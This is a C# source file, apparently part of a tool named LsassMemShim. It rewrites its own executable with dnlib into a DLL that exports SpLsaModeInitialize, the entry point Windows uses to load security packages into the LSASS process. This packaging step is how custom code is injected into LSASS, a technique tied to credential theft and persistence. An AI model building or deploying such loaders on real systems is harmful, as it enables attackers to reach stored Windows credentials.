using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using dnlib.DotNet;
using dnlib.DotNet.Writer;

namespace LsassMemShim
{
    public static class Exporter
    {
        public static void Export()
        {
            var data = File.ReadAllBytes(AppDomain.CurrentDomain.FriendlyName);
            var module = ModuleDefMD.Load(data);
            module.Kind = ModuleKind.Dll;
            module.EntryPoint = null;
            module.Name = module.Name.Replace(".exe", ".dll");
            var lsaExport = module.GetTypes().First(t => t.Name == "LSASSP").Methods.First(m => m.Name == "SpLsaModeInitialize");
            lsaExport.ExportInfo = new MethodExportInfo();
            lsaExport.IsUnmanagedExport = true;
            lsaExport.MethodSig.RetType = new CModOptSig(module.CorLibTypes.GetTypeRef("System.Runtime.CompilerServices", "CallConvStdCall"), lsaExport.MethodSig.RetType);
            var moduleOptions = new ModuleWriterOptions(module);
            moduleOptions.PEHeadersOptions.Machine = IntPtr.Size == 8 ? dnlib.PE.Machine.AMD64 : dnlib.PE.Machine.I386;
            moduleOptions.Cor20HeaderOptions.Flags &= ~(dnlib.DotNet.MD.ComImageFlags.ILOnly);
            if (IntPtr.Size == 4)
            {
                moduleOptions.Cor20HeaderOptions.Flags |= dnlib.DotNet.MD.ComImageFlags.Bit32Required;
                moduleOptions.Cor20HeaderOptions.Flags &= ~(dnlib.DotNet.MD.ComImageFlags.Bit32Preferred);
            }
            moduleOptions.ModuleKind = ModuleKind.Dll;
            module.Write(AppDomain.CurrentDomain.FriendlyName.Replace(".exe", ".dll"), moduleOptions);
        }
    }
}
